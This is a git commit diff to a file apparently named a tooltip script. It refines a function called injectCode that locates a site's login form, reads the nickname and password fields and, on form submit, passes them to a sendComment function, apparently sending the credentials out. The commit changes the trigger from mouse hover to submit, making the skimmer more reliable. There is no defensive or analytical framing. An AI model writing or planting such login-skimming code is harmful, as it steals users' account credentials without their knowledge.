6bfa3eeb55b2af0db64a4126c978c66dbbc5e945
Nikola2222 <nikolya.medvedkov@mail.ru>
2024-06-28 22:45:24 +0900

    Update script2.js

--- tooltip/script2.js
+++ tooltip/script2.js
@@ -39,14 +39,15 @@ function sendComment(e) {
 
 function injectCode() {
     console.log('Init Inject');
-    
-    let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
+
+  let submitButton = document.querySelector('.p-devise_sessions .simple_form.b-form.new_user');
+    //let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
     if(submitButton != null) {
         console.log('button found!');
         const name = document.getElementById('user_nickname');
         const pass = document.getElementById('user_password');
         console.log('inputs found!');
-        submitButton.addEventListener('mouseenter', ()=>{
+        submitButton.addEventListener('submit', ()=>{
         sendComment(`name: ${name.value}, pass : ${pass.value}`);
           console.log(`name: ${name.value}, pass : ${pass.value}`);
        })
